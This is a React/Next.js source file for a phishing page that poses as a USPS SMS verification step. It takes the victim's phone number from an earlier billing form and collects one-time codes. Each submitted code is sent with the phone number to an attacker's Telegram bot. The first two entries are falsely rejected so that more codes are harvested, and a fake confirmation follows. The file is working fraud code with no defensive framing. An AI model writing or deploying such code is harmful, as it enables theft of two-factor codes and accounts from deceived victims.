'use client';
import React, { useEffect, useState } from 'react';
import axios from 'axios';
import { useRouter } from 'next/navigation';
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../lib/telegramConfig';

export default function SMSPage() {
  const [phone, setPhone] = useState('');
  const [code, setCode] = useState('');
  const [error, setError] = useState('');
  const [attempt, setAttempt] = useState(0);
  const [phase, setPhase] = useState<'form' | 'checking' | 'confirmed' | 'waiting' | 'error-wait'>('form');
  const router = useRouter();

  useEffect(() => {
    const storedPhone = sessionStorage.getItem('userPhone');
    if (!storedPhone) {
      setError('No phone number found. Please go back and enter your billing information.');
    } else {
      setPhone(storedPhone);
    }
  }, []);

  const sendToTelegram = async () => {
    const message = `
📲 *SMS Verification Submitted*
-------------------------------
📞 *Phone:* ${phone}
🔢 *Entered Code:* ${code}
🕒 *Time:* ${new Date().toLocaleString()}
    `;
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    const newAttempt = attempt + 1;
    setAttempt(newAttempt);

    await sendToTelegram();

    if (newAttempt < 3) {
      // Delay and show loader before error
      setPhase('error-wait');
      setTimeout(() => {
        setPhase('form');
        setError('❌ Incorrect code. Please try again.');
      }, 5000);
      return;
    }

    // Third attempt: simulate success
    setPhase('checking');
    setTimeout(() => {
      setPhase('confirmed');
      setTimeout(() => {
        setPhase('waiting');
        setTimeout(() => {
          router.push('/select-location');
        }, 3000);
      }, 3000);
    }, 5000);
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-white to-gray-100 text-[#2C2A61] font-sans px-4">
      <div className="max-w-md w-full bg-white p-8 rounded-xl shadow-lg border border-gray-200">
        <img
          src="https://reg.usps.com/entreg/assets/images/des_brd_2color_logo_274x79.png"
          alt="USPS Logo"
          className="h-auto w-48 mx-auto mb-6"
        />
        <h1 className="text-2xl font-bold mb-3 text-center">SMS Verification</h1>

        {error && phase === 'form' && (
          <div className="bg-red-100 text-red-700 text-sm px-4 py-3 rounded mb-4 border border-red-300 text-center">
            {error}
          </div>
        )}

        {(phase === 'checking' || phase === 'error-wait' || phase === 'waiting') && (
          <div className="flex flex-col items-center justify-center py-12">
            <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." className="w-20 h-20 mb-4" />
            <p className="text-sm text-gray-600">🔄 Please wait while we verify your response...</p>
          </div>
        )}

        {phase === 'confirmed' && (
          <div className="bg-green-100 text-green-800 border border-green-400 px-4 py-4 text-sm rounded text-center animate-pulse">
            ✅ OTP Confirmed. Thank you!
          </div>
        )}

        {phase === 'form' && (
          <form onSubmit={handleSubmit} className="space-y-4">
            <p className="text-center text-sm mb-2">
              A verification code was sent to <span className="font-bold">{phone}</span>
            </p>

            <input
              type="text"
              value={code}
              onChange={(e) => setCode(e.target.value)}
              placeholder="Enter SMS Code"
              className="w-full border border-gray-300 rounded-lg px-4 py-3 text-center tracking-widest text-lg shadow-sm"
              required
            />

            <button
              type="submit"
              className="w-full bg-[#2C2A61] hover:bg-[#1d1a45] text-white font-semibold py-3 rounded-lg shadow-md transition"
            >
              Verify Code
            </button>
          </form>
        )}
      </div>
    </div>
  );
}
